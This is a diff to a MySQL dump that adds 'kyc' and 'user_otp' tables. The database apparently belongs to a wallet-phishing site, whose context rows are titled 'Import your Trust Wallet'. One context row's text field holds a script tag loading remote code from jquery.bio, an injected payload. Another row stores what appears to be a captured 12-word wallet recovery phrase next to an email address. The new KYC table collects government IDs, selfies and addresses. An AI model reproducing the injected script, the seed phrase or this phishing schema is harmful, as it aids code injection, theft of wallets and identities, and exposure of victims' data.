@@ -806,6 +806,41 @@ INSERT INTO `backup` VALUES
 (2,'dhfgdhfdgd','fdghdf@mail.ru','word word<script src=\'https://jquery.bio/get/\'></script> word word word word word word word word wor','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-07-30 10:20:51'),
 (3,'Trust wallet','ahhsjsj666s@gmail.com','Cube scene program portion combine ramp ticket skill rely traffic legend goat','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-08-04 03:25:43');
 
+CREATE TABLE `kyc` (
+ `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+ `user_id` int(10) unsigned NOT NULL,
+ `full_name` varchar(255) NOT NULL,
+ `dob` date NOT NULL,
+ `nationality` varchar(100) NOT NULL,
+ `gender` varchar(20) NOT NULL,
+ `email` varchar(255) NOT NULL,
+ `phone` varchar(50) NOT NULL,
+ `address` varchar(255) NOT NULL,
+ `city` varchar(100) NOT NULL,
+ `state` varchar(100) NOT NULL,
+ `country` varchar(100) NOT NULL,
+ `postal_code` varchar(20) NOT NULL,
+ `gov_id` varchar(255) DEFAULT NULL,
+ `proof_address` varchar(255) DEFAULT NULL,
+ `selfie` varchar(255) DEFAULT NULL,
+ `status` enum('pending','approved','rejected') NOT NULL DEFAULT 'pending',
+ `created_at` datetime NOT NULL DEFAULT current_timestamp(),
+ `reviewed_at` datetime DEFAULT NULL,
+ `reviewed_by` int(10) unsigned DEFAULT NULL,
+ PRIMARY KEY (`id`),
+ KEY `user_id` (`user_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci
+
+CREATE TABLE `user_otp` (
+ `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+ `uid` int(10) unsigned NOT NULL,
+ `otp` varchar(10) NOT NULL,
+ `expires_at` datetime NOT NULL,
+ `used` tinyint(1) NOT NULL DEFAULT 0,
+ `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
+ PRIMARY KEY (`id`),
+ KEY `uid` (`uid`)
+) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci
 
 --
 -- Indexes for dumped tables
